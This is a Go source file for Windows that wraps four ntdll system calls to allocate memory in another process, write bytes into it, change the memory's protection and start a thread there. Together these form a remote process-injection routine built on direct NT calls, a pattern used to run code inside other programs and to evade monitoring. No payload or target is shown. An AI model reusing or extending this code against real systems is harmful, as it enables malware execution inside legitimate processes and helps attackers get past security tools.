//go:build windows && amd64

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modNtdll = windows.NewLazySystemDLL("ntdll.dll")

	procNtAllocateVirtualMemory = modNtdll.NewProc("NtAllocateVirtualMemory")
	procNtWriteVirtualMemory    = modNtdll.NewProc("NtWriteVirtualMemory")
	procNtProtectVirtualMemory  = modNtdll.NewProc("NtProtectVirtualMemory")
	procNtCreateThreadEx        = modNtdll.NewProc("NtCreateThreadEx")
)

const (
	memCommitReserve = uintptr(windows.MEM_COMMIT | windows.MEM_RESERVE)
	threadAllAccess  = uintptr(0x1FFFFF)
)

// ntAllocRemote allocates PAGE_READWRITE memory in a remote process.
//
// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, 0, &RegionSize,
//
//	MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
func ntAllocRemote(hProcess, size uintptr) (uintptr, error) {
	var base uintptr
	sz := size
	r, _, _ := procNtAllocateVirtualMemory.Call(
		hProcess,
		uintptr(unsafe.Pointer(&base)),
		0,
		uintptr(unsafe.Pointer(&sz)),
		memCommitReserve,
		uintptr(windows.PAGE_READWRITE),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: 0x%X", r)
	}
	return base, nil
}

// ntWriteMemory writes bytes into a remote process at base.
//
// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, Size, &Written)
func ntWriteMemory(hProcess, base uintptr, data []byte) error {
	var written uintptr
	r, _, _ := procNtWriteVirtualMemory.Call(
		hProcess,
		base,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r != 0 {
		return fmt.Errorf("NtWriteVirtualMemory: 0x%X", r)
	}
	return nil
}

// ntProtectRemote changes the protection of memory in a remote process.
//
// NtProtectVirtualMemory(ProcessHandle, &BaseAddress, &Size, NewProtect, &OldProtect)
func ntProtectRemote(hProcess, base, size, prot uintptr) error {
	var old uintptr
	r, _, _ := procNtProtectVirtualMemory.Call(
		hProcess,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&size)),
		prot,
		uintptr(unsafe.Pointer(&old)),
	)
	if r != 0 {
		return fmt.Errorf("NtProtectVirtualMemory: 0x%X", r)
	}
	return nil
}

// ntCreateThreadRemote starts a new thread in a remote process at startAddr.
//
// NtCreateThreadEx(&Thread, THREAD_ALL_ACCESS, nil, ProcessHandle,
//
//	StartRoutine, nil, 0, 0, 0, 0, nil)
func ntCreateThreadRemote(hProcess, startAddr uintptr) error {
	var hThread uintptr
	r, _, _ := procNtCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		threadAllAccess,
		0,
		hProcess,
		startAddr,
		0, // Argument
		0, // CreateFlags  (0 = start immediately)
		0, // ZeroBits
		0, // StackSize    (system default)
		0, // MaxStackSize (system default)
		0, // AttributeList
	)
	if r != 0 {
		return fmt.Errorf("NtCreateThreadEx: 0x%X", r)
	}
	if hThread != 0 {
		windows.CloseHandle(windows.Handle(hThread))
	}
	return nil
}
